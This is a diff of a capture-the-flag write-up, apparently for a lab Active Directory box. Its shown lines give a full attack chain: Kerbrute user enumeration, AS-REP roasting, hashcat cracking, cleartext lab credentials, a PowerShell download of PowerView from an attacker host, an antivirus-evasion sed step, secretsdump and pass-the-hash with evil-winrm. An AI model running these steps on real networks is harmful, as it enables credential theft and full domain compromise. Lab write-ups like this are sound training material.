@@ -27,6 +27,7 @@ nmap -n -sV --script="ldap\* and not brute" 10.10.123.209
 ![image3](../resources/9492bebb8acc4b4ba0a00b63e7eb4863.png)
 
 - Enumerate users with Kerbrute:
+
 ```bash
 ./kerbrute userenum --dc 10.10.123.209 -d spookysec.local userlist.txt -o validusers.txt
 
@@ -37,6 +38,7 @@ nmap -n -sV --script="ldap\* and not brute" 10.10.123.209
 ![image4](../resources/6359efe477b946ac8545e0890e13b941.png)
 
 - Cut fields:
+
 ```bash
 cat validusers.txt | cut -d " " -f 8 > validusers_edited.txt
 
@@ -45,6 +47,7 @@ cat validusers.txt | cut -d " " -f 8 > validusers_edited.txt
 ![image5](../resources/f5253e54d5314db4b0bfe97dda247c0b.png)
 
 - ASRepRoasting:
+
 ```bash
 impacket-GetNPUsers spookysec.local/ -users validusers_edited.txt -no-pass -dc-ip 10.10.123.209
 
@@ -55,6 +58,7 @@ impacket-GetNPUsers spookysec.local/ -users validusers_edited.txt -no-pass -dc-i
 - Copy hash to file (hash)
 
 - Crack with hashcat:
+
 ```bash
 hashcat -m 18200 --force -a 0 hash /usr/share/wordlists/rockyou.txt
 
@@ -65,6 +69,7 @@ hashcat -m 18200 --force -a 0 hash /usr/share/wordlists/rockyou.txt
 Got credentials: **svc-admin : management2005**
 
 - RDP:
+
 ```bash
 xfreerdp /v:10.10.123.209 /u:svc-admin /p:management2005 /dynamic-resolution /cert:ignore
 
@@ -73,6 +78,7 @@ xfreerdp /v:10.10.123.209 /u:svc-admin /p:management2005 /dynamic-resolution /ce
 ![image8](../resources/5dc5c24db85646779d67504c1dcee02b.png)
 
 - Enumeration:
+
 ```bash
 query user
 
@@ -83,6 +89,7 @@ query user
 Only us logged in
 
 - Upload PowerView.ps1:
+
 ```bash
 (New-Object System.Net.WebClient).DownloadFile('http://10.8.24.66:8080/PowerView.ps1', 'C:\Users\svc-admin\PowerView.ps1')
 
@@ -91,9 +98,9 @@ Only us logged in
 ![image10](../resources/7e283975acf14b2baa546b84c5a43bb1.png)
 
 **<u>AV Workaround for PowerView:</u>**
-```bash
-sed '/\<#/,/#\>/d' PowerView.ps1 > new_powerview.ps1
 
+```bash
+  sed '/<#/,/#>/d' PowerView.ps1 > new_powerview.ps1
 ```
 
 ![image11](../resources/8f4a6f3f7f224933b636c0945ab94248.png)
@@ -115,6 +122,7 @@ Moving on...
 
 - We have a share /backup  
   Connect with:
+
 ```bash
 smbclient //10.10.173.147/backup -U thm-ad/svc-admin%management2005
 
@@ -145,6 +153,7 @@ echo "YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw" | base64 -d
 ![image18](../resources/46edce029af74d30b3d70291f8247b03.png)
 
 - To dump hashes use:
+
 ```bash
 impacket-secretsdump spookysec.local/backup:backup2517860@10.10.173.147 -dc-ip 10.10.173.147
 
@@ -153,6 +162,7 @@ impacket-secretsdump spookysec.local/backup:backup2517860@10.10.173.147 -dc-ip 1
 ![image19](../resources/701bb2f608b14e8da350129bb4ae6a0f.png)
 
 - You can use the hash with evil-winrm to connect:
+
 ```bash
 evil-winrm -u Administrator -H 0e0363213e37b94221497260b0bcb4fc -i 10.10.173.147
 
